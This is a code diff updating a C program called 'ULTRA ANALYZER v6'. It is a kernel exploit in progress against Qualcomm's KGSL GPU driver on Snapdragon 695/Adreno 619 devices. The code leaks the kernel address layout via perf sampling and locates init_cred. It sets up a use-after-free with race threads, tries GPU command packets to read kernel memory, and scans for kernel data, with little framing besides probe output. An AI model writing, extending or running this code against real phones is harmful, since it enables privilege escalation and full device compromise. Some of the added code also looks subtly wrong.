@@ -98,8 +98,17 @@ static void *g_dst_m = NULL;
 static unsigned int g_ctx = 0;
 static int g_ib_id = -1;
 static int g_dst_id = -1;
+static int g_debug_level = 1;
 
 static void die(const char *msg) { perror(msg); exit(1); }
+
+static void debug_printf(int level, const char *fmt, ...) {
+    if (level > g_debug_level) return;
+    va_list args;
+    va_start(args, fmt);
+    vprintf(fmt, args);
+    va_end(args);
+}
 
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
@@ -136,7 +145,7 @@ static uint64_t detect_kaslr(void) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }
+    if (fd < 0) { debug_printf(0, "  perf_open: errno=%d\n", errno); return 0; }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
@@ -165,19 +174,19 @@ static uint64_t detect_kaslr(void) {
             n_ips++;
             uint64_t ip = *(uint64_t *)(hdr + 1);
             if (first_kernel_ip == 0) first_kernel_ip = ip;
-            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
+            if (n_ips <= 3) debug_printf(0, "    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
         }
         tail += hdr->size;
     }
 
     munmap(buf, mmap_size); close(fd);
-    printf("    kernel_samples=%d\n", n_ips);
+    debug_printf(0, "    kernel_samples=%d\n", n_ips);
 
-    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
+    if (n_ips == 0) { debug_printf(0, "  perf: no kernel IPs\n"); return 0; }
 
     uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
     uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
-    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
+    debug_printf(0, "    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
         (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
     return ic_addr;
 }
@@ -262,11 +271,10 @@ static void init_globals(void) {
     g_dst_m = gpuobj_mmap(0x4000, g_dst_id);
     gpuobj_info(g_dst_id, &g_dst_ga, NULL);
     g_ctx = create_context();
-    printf("  INIT: ib_id=%d ib_ga=0x%lX dst_id=%d dst_ga=0x%lX ctx=%u\n",
+    debug_printf(0, "  INIT: ib_id=%d ib_ga=0x%lX dst_id=%d dst_ga=0x%lX ctx=%u\n",
         g_ib_id, (unsigned long)g_ib_ga, g_dst_id, (unsigned long)g_dst_ga, g_ctx);
 }
 
-/* コマンド送信のヘルパー */
 static int run_cmd(uint32_t *cmd, int dwords) {
     memcpy(g_ib_m, cmd, dwords * 4);
     __sync_synchronize();
@@ -278,7 +286,11 @@ static int run_cmd(uint32_t *cmd, int dwords) {
     return 0;
 }
 
-/* CP_MEM_WRITE で値を書き込む */
+/* ============================================================
+   Alternative read primitives
+   ============================================================ */
+
+/* 1. CP_MEM_WRITE + CP_REG_TO_MEM: write value to memory, then read from register */
 static int gpu_write_kernel(uint64_t va, uint64_t val) {
     uint32_t cmd[16];
     int dw = 0;
@@ -292,24 +304,6 @@ static int gpu_write_kernel(uint64_t va, uint64_t val) {
     return run_cmd(cmd, dw);
 }
 
-/* CP_MEM_TO_MEM で読み出し (Adreno 619 では失敗する可能性大) */
-static int gpu_read_memtomem(uint64_t dst_va, uint64_t src_va, int count) {
-    uint32_t cmd[256];
-    int dw = 0;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    for (int i = 0; i < count; i++) {
-        uint32_t dl, dh, sl, sh;
-        split64(dst_va + i*8, &dl, &dh);
-        split64(src_va + i*8, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-        cmd[dw++] = sl; cmd[dw++] = sh;
-    }
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    return run_cmd(cmd, dw);
-}
-
-/* CP_REG_TO_MEM でレジスタ値を読み出す (代替読み出し) */
 static int gpu_read_reg_to_mem(uint64_t dst_va, uint32_t reg) {
     uint32_t cmd[16];
     int dw = 0;
@@ -322,7 +316,7 @@ static int gpu_read_reg_to_mem(uint64_t dst_va, uint32_t reg) {
     return run_cmd(cmd, dw);
 }
 
-/* CP_MEM_TO_REG でメモリ値をレジスタに書き込む */
+/* 2. CP_MEM_TO_REG + CP_REG_TO_MEM: write memory value to register, then read register */
 static int gpu_write_mem_to_reg(uint32_t reg, uint64_t src_va) {
     uint32_t cmd[16];
     int dw = 0;
@@ -335,23 +329,28 @@ static int gpu_write_mem_to_reg(uint32_t reg, uint64_t src_va) {
     return run_cmd(cmd, dw);
 }
 
-/* CP_WAIT_REG_MEM でレジスタ値が特定の値になるまで待機 */
-static int gpu_wait_reg_mem(uint32_t reg, uint64_t mem_va, uint32_t val, uint32_t mask) {
-    uint32_t cmd[16];
+/* 3. CP_MEM_WRITE + CP_MEM_TO_MEM (original, but likely broken) */
+static int gpu_read_memtomem(uint64_t dst_va, uint64_t src_va, int count) {
+    uint32_t cmd[256];
     int dw = 0;
-    uint32_t ml, mh, vl, vh;
-    split64(mem_va, &ml, &mh);
-    split64(val, &vl, &vh);
-    cmd[dw++] = cp_type7(CP_WAIT_REG_MEM, 6);
-    cmd[dw++] = reg;
-    cmd[dw++] = ml; cmd[dw++] = mh;
-    cmd[dw++] = vl; cmd[dw++] = vh;
-    cmd[dw++] = mask;
+    cmd[dw++] = cp_type7(CP_NOP, 0);
+    for (int i = 0; i < count; i++) {
+        uint32_t dl, dh, sl, sh;
+        split64(dst_va + i*8, &dl, &dh);
+        split64(src_va + i*8, &sl, &sh);
+        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+        cmd[dw++] = 0x40000000; // Adreno 6xx specific flag?
+        cmd[dw++] = dl; cmd[dw++] = dh;
+        cmd[dw++] = sl; cmd[dw++] = sh;
+    }
     cmd[dw++] = cp_type7(CP_NOP, 0);
     return run_cmd(cmd, dw);
 }
 
-/* レース用スレッド - IMPORT を連続実行 */
+/* ============================================================
+   Race threads
+   ============================================================ */
+
 static void *race_thread_import(void *arg) {
     volatile int *done = (volatile int *)arg;
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
@@ -363,23 +362,34 @@ static void *race_thread_import(void *arg) {
     };
     while (!*done) {
         ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-        usleep(100);
-    }
-    return NULL;
-}
-
-/* レース用スレッド - メモリ確保を連続実行 */
-static void *race_thread_alloc(void *arg) {
-    volatile int *done = (volatile int *)arg;
-    while (!*done) {
-        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-        gpuobj_free(id);
         usleep(50);
     }
     return NULL;
 }
 
-/* レース実行 - 複数パターンを試行 */
+static void *race_thread_alloc(void *arg) {
+    volatile int *done = (volatile int *)arg;
+    while (!*done) {
+        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
+        if (id >= 0) gpuobj_free(id);
+        usleep(50);
+    }
+    return NULL;
+}
+
+static void *race_thread_mmap(void *arg) {
+    volatile int *done = (volatile int *)arg;
+    int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
+    while (!*done) {
+        void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
+            MAP_SHARED, kgsl_fd, (off_t)id << 12);
+        if (p != MAP_FAILED) munmap(p, 0x1000);
+        usleep(50);
+    }
+    gpuobj_free(id);
+    return NULL;
+}
+
 static int run_race(int pattern) {
     pthread_t thr;
     volatile int race_done = 0;
@@ -387,12 +397,13 @@ static int run_race(int pattern) {
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
     uint64_t ov_gpuaddr = 0;
     gpuobj_info(ov_id, &ov_gpuaddr, NULL);
-    printf("  Race pattern %d: ov_id=%d ov_gpuaddr=0x%lX\n", pattern, ov_id, (unsigned long)ov_gpuaddr);
+    debug_printf(0, "  Race pattern %d: ov_id=%d ov_gpuaddr=0x%lX\n", pattern, ov_id, (unsigned long)ov_gpuaddr);
 
-    if (pattern == 0) {
-        pthread_create(&thr, NULL, race_thread_import, (void*)&race_done);
-    } else {
-        pthread_create(&thr, NULL, race_thread_alloc, (void*)&race_done);
+    switch(pattern) {
+        case 0: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
+        case 1: pthread_create(&thr, NULL, race_thread_alloc, (void*)&race_done); break;
+        case 2: pthread_create(&thr, NULL, race_thread_mmap, (void*)&race_done); break;
+        default: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
     }
 
     for (int i = 0; i < 5000000 && !hit; i++) {
@@ -407,7 +418,7 @@ static int run_race(int pattern) {
         }
         if (e == ENODEV) { hit = 1; break; }
         if (i % 1000000 == 0 && i > 0) {
-            printf("    race %d/5000000 errno=%d\n", i, e);
+            debug_printf(0, "    race %d/5000000 errno=%d\n", i, e);
         }
     }
 
@@ -417,13 +428,57 @@ static int run_race(int pattern) {
     return hit;
 }
 
+/* ============================================================
+   Import parameter testing
+   ============================================================ */
+
+static void test_import_params(void) {
+    debug_printf(0, "[*] Testing KGSL_GPUOBJ_IMPORT parameters...\n");
+    uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
+    uint64_t test_addrs[] = {
+        (uint64_t)(uintptr_t)user_buf,
+        (uint64_t)(uintptr_t)(((uintptr_t)user_buf + 0xFFF) & ~0xFFFULL),
+        (uint64_t)(uintptr_t)g_dst_m,
+        (uint64_t)(uintptr_t)g_ib_m,
+    };
+    size_t test_sizes[] = {8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096};
+    uint64_t test_flags[] = {KGSL_MEMFLAGS_USE_CPU_MAP, 0, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK};
+
+    for (int a = 0; a < sizeof(test_addrs)/sizeof(test_addrs[0]); a++) {
+        for (int s = 0; s < sizeof(test_sizes)/sizeof(test_sizes[0]) && s < 5; s++) {
+            for (int f = 0; f < sizeof(test_flags)/sizeof(test_flags[0]); f++) {
+                struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = test_addrs[a] };
+                struct kgsl_gpuobj_import imp = {
+                    .priv = (uint64_t)&uaddr,
+                    .priv_len = test_sizes[s],
+                    .flags = test_flags[f],
+                    .type = KGSL_USER_MEM_TYPE_ADDR,
+                };
+                int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+                if (ret == 0) {
+                    debug_printf(0, "  IMPORT(addr=0x%lX,size=%zu,flags=0x%lX) SUCCESS id=%u\n",
+                        (unsigned long)test_addrs[a], test_sizes[s], (unsigned long)test_flags[f], imp.id);
+                    gpuobj_free(imp.id);
+                    return;
+                }
+            }
+        }
+    }
+    debug_printf(0, "  All IMPORT combinations failed (errno=%d)\n", errno);
+}
+
+/* ============================================================
+   Main
+   ============================================================ */
+
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("=== ULTRA ANALYZER v4 — Adreno 619 Deep Dive ===\n\n");
+    printf("=== ULTRA ANALYZER v6 — Deep KGSL Analysis (Snapdragon 695/Adreno 619) ===\n\n");
 
     struct utsname u;
     uname(&u);
     printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);
+    printf("SoC: Snapdragon 695 (SM6375) / GPU: Adreno 619\n\n");
 
     printf("[*] Opening /dev/kgsl-3d0...\n");
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
@@ -448,7 +503,7 @@ int main(int argc, char **argv) {
     uint64_t v0 = *(volatile uint64_t*)g_dst_m;
     printf("  DST[0]=0x%016lX %s\n", (unsigned long)v0, v0 == test_val ? "[OK]" : "[FAIL]");
 
-    printf("[*] Testing CP_MEM_TO_MEM (src=DST, dst=DST+8)...\n");
+    printf("[*] Testing CP_MEM_TO_MEM (original, likely broken)...\n");
     memset(g_dst_m, 0, 16);
     gpu_read_memtomem(g_dst_ga + 8, g_dst_ga, 1);
     uint64_t v1 = *(volatile uint64_t*)(g_dst_m + 8);
@@ -475,33 +530,39 @@ int main(int argc, char **argv) {
         test_reg2, (unsigned long)test_data, (unsigned long)v3,
         v3 == test_data ? "[OK] MEM→REG→MEM works" : "[FAIL]");
 
-    printf("[*] Testing CP_WAIT_REG_MEM...\n");
-    gpu_write_kernel(g_dst_ga, 0x12345678);
-    int ret = gpu_wait_reg_mem(0x00000400, g_dst_ga, 0x12345678, 0xFFFFFFFF);
-    printf("  WAIT_REG_MEM ret=%d %s\n", ret, ret == 0 ? "[OK]" : "[FAIL]");
+    printf("[*] Testing indirect read via CP_MEM_WRITE + CP_REG_TO_MEM (using a scratch register)...\n");
+    uint32_t scratch_reg = 0x00000408;
+    uint64_t scratch_val = 0xDEADBEEFCAFEBABEULL;
+    gpu_write_kernel(g_dst_ga, scratch_val);
+    gpu_write_mem_to_reg(scratch_reg, g_dst_ga);
+    memset(g_dst_m, 0, 16);
+    gpu_read_reg_to_mem(g_dst_ga, scratch_reg);
+    uint64_t v4 = *(volatile uint64_t*)g_dst_m;
+    printf("  Scratch REG 0x%08X = 0x%016lX %s\n", scratch_reg, (unsigned long)v4,
+        v4 == scratch_val ? "[OK] Indirect read works" : "[FAIL]");
 
     printf("[*] Testing GPU read from kernel address using alternative method...\n");
     if (init_cred_addr) {
-        /* 方法1: CP_MEM_TO_MEM (既に失敗することが判明) */
-        memset(g_dst_m, 0, 16);
-        gpu_read_memtomem(g_dst_ga, init_cred_addr, 1);
-        uint64_t v4 = *(volatile uint64_t*)g_dst_m;
-        printf("  CP_MEM_TO_MEM(init_cred)=0x%016lX %s\n", (unsigned long)v4,
-            v4 != 0 ? "[READABLE]" : "[ZERO - permission/format issue]");
-
-        /* 方法2: CP_MEM_WRITE + CP_REG_TO_MEM の組み合わせ */
-        /* まずレジスタにアドレスを書き込み、そのレジスタ経由で読み出す */
-        printf("  Trying indirect read via register...\n");
-        uint32_t addr_reg = 0x00000408;
-        uint32_t data_reg = 0x0000040C;
+        // Try indirect read via register
+        uint32_t addr_reg = 0x0000040C;
+        uint32_t data_reg = 0x00000410;
         gpu_write_mem_to_reg(addr_reg, init_cred_addr);
-        gpu_wait_reg_mem(addr_reg, init_cred_addr, (uint32_t)init_cred_addr, 0xFFFFFFFF);
+        usleep(1000);
         memset(g_dst_m, 0, 16);
         gpu_read_reg_to_mem(g_dst_ga, data_reg);
         uint64_t v5 = *(volatile uint64_t*)g_dst_m;
-        printf("  Indirect read via REG=0x%016lX %s\n", (unsigned long)v5,
+        printf("  Indirect read (init_cred) via REG=0x%016lX %s\n", (unsigned long)v5,
             v5 != 0 ? "[READABLE]" : "[ZERO]");
+
+        // Try another method: CP_MEM_TO_MEM (fallback)
+        memset(g_dst_m, 0, 16);
+        gpu_read_memtomem(g_dst_ga, init_cred_addr, 1);
+        uint64_t v6 = *(volatile uint64_t*)g_dst_m;
+        printf("  CP_MEM_TO_MEM(init_cred)=0x%016lX %s\n", (unsigned long)v6,
+            v6 != 0 ? "[READABLE]" : "[ZERO]");
     }
+
+    test_import_params();
 
     printf("[*] Testing gpuobj_info for all allocated objects...\n");
     int ids[] = {g_ib_id, g_dst_id};
@@ -512,53 +573,15 @@ int main(int argc, char **argv) {
             ids[i], ret2, (unsigned long)ga, (unsigned long)fl);
     }
 
-    printf("[*] Testing KGSL_GPUOBJ_IMPORT with various parameters...\n");
-    uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
-
-    /* テスト1: 適正サイズ */
-    struct kgsl_gpuobj_import_useraddr uaddr1 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
-    struct kgsl_gpuobj_import imp1 = {
-        .priv = (uint64_t)&uaddr1,
-        .priv_len = sizeof(uaddr1),
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
-        .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    int r1 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp1);
-    printf("  IMPORT(size=%zu) ret=%d errno=%d\n", sizeof(uaddr1), r1, r1 < 0 ? errno : 0);
-
-    /* テスト2: ページサイズ */
-    struct kgsl_gpuobj_import_useraddr uaddr2 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
-    struct kgsl_gpuobj_import imp2 = {
-        .priv = (uint64_t)&uaddr2,
-        .priv_len = 0x1000,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
-        .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    int r2 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp2);
-    printf("  IMPORT(size=0x1000) ret=%d errno=%d\n", r2, r2 < 0 ? errno : 0);
-
-    /* テスト3: フラグなし */
-    struct kgsl_gpuobj_import_useraddr uaddr3 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
-    struct kgsl_gpuobj_import imp3 = {
-        .priv = (uint64_t)&uaddr3,
-        .priv_len = sizeof(uaddr3),
-        .flags = 0,
-        .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    int r3 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp3);
-    printf("  IMPORT(flags=0) ret=%d errno=%d\n", r3, r3 < 0 ? errno : 0);
-
-    printf("[*] Phase 1: Setup UAF + race (improved)\n");
+    printf("[*] Phase 1: Setup UAF + race (improved for Snapdragon 695)\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
 
-    /* UAF オブジェクト割り当て */
     int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
     if (uaf_m == MAP_FAILED) die("mmap UAF");
     munmap(uaf_m, UAF_SIZE);
 
-    /* BOGUS ページ (サイズを適正化) */
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
@@ -573,7 +596,7 @@ int main(int argc, char **argv) {
 
     printf("[*] Phase 2: Race (trying multiple patterns)\n");
     int race_won = 0;
-    for (int p = 0; p < 2 && !race_won; p++) {
+    for (int p = 0; p < 3 && !race_won; p++) {
         printf("  Trying pattern %d...\n", p);
         race_won = run_race(p);
         if (race_won) printf("  [+] Race won with pattern %d!\n", p);
@@ -597,7 +620,6 @@ int main(int argc, char **argv) {
 
     for (uint64_t va = scan_start; va < scan_end && found < 5; va += 0x1000) {
         memset(g_dst_m, 0, 0x1000);
-        /* CP_MEM_TO_MEM で読み出し (失敗するかもしれない) */
         gpu_read_memtomem(g_dst_ga, va, 16);
         uint64_t *data = (uint64_t*)g_dst_m;
         int nz = 0;
@@ -624,9 +646,12 @@ int main(int argc, char **argv) {
     printf("#define SPRAY_PIDS 2000\n");
     if (init_cred_addr) {
         printf("// init_cred address: 0x%lX\n", (unsigned long)init_cred_addr);
+        printf("// VMLINUX_INIT_CRED offset: 0x%lX\n", (unsigned long)(init_cred_addr - (init_cred_addr - VMLINUX_TEXT) & ~0x1FFFFFULL));
     }
+    printf("// SoC: Snapdragon 695 (SM6375)\n");
+    printf("// GPU: Adreno 619 (GPU ID: 0x6010600)\n");
 
-    printf("\n[*] Adreno 619 probe completed.\n");
+    printf("\n[*] Analysis complete.\n");
     close(kgsl_fd);
     return 0;
 }
